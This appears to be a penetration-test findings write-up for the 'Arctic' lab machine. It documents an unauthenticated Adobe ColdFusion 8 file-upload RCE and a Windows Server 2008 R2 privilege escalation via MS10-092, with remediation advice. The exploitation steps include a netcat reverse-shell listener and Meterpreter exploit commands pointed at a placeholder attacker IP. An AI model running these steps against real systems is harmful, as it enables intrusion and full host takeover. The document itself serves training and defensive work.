# Findings — Arctic

## Finding 1 — Unauthenticated Arbitrary File Upload in Adobe ColdFusion 8 (RCE)

### Summary
The Adobe ColdFusion 8 administrative interface on TCP/8500 is affected by an unauthenticated arbitrary file-upload vulnerability. An attacker can upload a JSP payload and request it, achieving remote code execution as the ColdFusion service account.

### Vulnerability Details
- **Type:** Unrestricted File Upload → Remote Code Execution
- **Severity:** Critical (CVSS 3.1 ~9.8)
- **Affected Component:** Adobe ColdFusion 8, admin interface `/CFIDE/administrator/` on TCP/8500
- **Authentication required:** None

### Technical Analysis
ColdFusion 8 allows attacker-controlled files to be written into a web-served directory. A JSP payload placed there is executed by the ColdFusion (Java) runtime as the service account. Because the server is slow to respond, timing-sensitive tooling (the Metasploit module) is unreliable, so a standalone PoC that uploads and then triggers the payload is used.

### Exploitation Steps
1. Confirm ColdFusion 8 at `http://<TARGET_IP>:8500/CFIDE/administrator/`.
2. Configure the public PoC (`lhost`, `lport`, `rhost=<TARGET_IP>`, `rport=8500`).
3. Start a listener: `nc -lvnp 4444`.
4. Run the PoC — it generates the payload, uploads the JSP, and triggers execution.
5. Receive a shell as `arctic\tolis`.

### Impact Assessment
| Category | Description |
|----------|-------------|
| Confidentiality | High — read files accessible to the service account |
| Integrity | High — write/modify files, deploy tooling |
| Availability | High — can disrupt the application/host |
| Exploitation | Trivial — unauthenticated, public PoC |

### Remediation
**Immediate:** Restrict/disable the ColdFusion admin interface (network ACLs, VPN); block untrusted access to TCP/8500.
**Long-term:** Upgrade to a supported ColdFusion release and apply file-upload patches; enforce file-type/extension controls; disable script execution in upload directories; run under a least-privilege service account.

### Mappings
OWASP A06; A05; CWE-434; CWE-1104.

### Re-test
Executable/JSP upload is rejected; admin interface is not reachable unauthenticated; component is on a supported, patched version.

---

## Finding 2 — Local Privilege Escalation via Missing OS Patches

### Summary
The host is a legacy, unpatched Windows Server 2008 R2. From the service-account foothold, a public local exploit escalates to SYSTEM.

### Vulnerability Details
- **Type:** Local Privilege Escalation (missing OS security updates)
- **Severity:** High
- **Affected Component:** Windows Server 2008 R2 (unpatched); Task Scheduler / kernel (MS10-092, MS10-059)
- **Authentication required:** Local (service-account foothold)

### Technical Analysis
`local_exploit_suggester` identifies multiple viable local exploits due to the missing patch level. The intended vector (MS10-092 "schelevator", Task Scheduler) requires an x64 process context, so the Meterpreter session is migrated to an x64 process owned by the current user before running the exploit.

### Exploitation Steps
1. From Meterpreter: `run post/multi/recon/local_exploit_suggester`.
2. `ps` — identify an x64 process owned by the current user.
3. `migrate <x64_PID>`.
4. `run exploit/windows/local/ms10_092_schelevator LHOST=<ATTACKER_IP> LPORT=5555`.
5. `getuid` → `NT AUTHORITY\SYSTEM`.

### Impact Assessment
| Category | Description |
|----------|-------------|
| Confidentiality | High — full access to host secrets |
| Integrity | High — arbitrary changes as SYSTEM |
| Availability | High — full host control |
| Exploitation | Low effort — public local exploit on an unpatched OS |

### Remediation
**Immediate:** Isolate/decommission the unsupported host.
**Long-term:** Apply OS security updates; move off end-of-life Windows; monitor for local-exploit behaviour (scheduled-task tampering).

### Mappings
OWASP A06; CWE-269; CWE-1104.

### Re-test
Local-exploit attempts fail on a patched OS; the least-privilege service account cannot elevate.

## Testing Checklist
- [ ] ColdFusion admin reachable unauthenticated on TCP/8500
- [ ] File upload accepts executable/JSP content
- [ ] JSP executes (shell as service account)
- [ ] local_exploit_suggester returns viable local exploits
- [ ] Privesc yields SYSTEM
- [ ] Verify remediation blocks upload and elevation

## References
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [Adobe ColdFusion Security Bulletins](https://helpx.adobe.com/security/products/coldfusion.html)
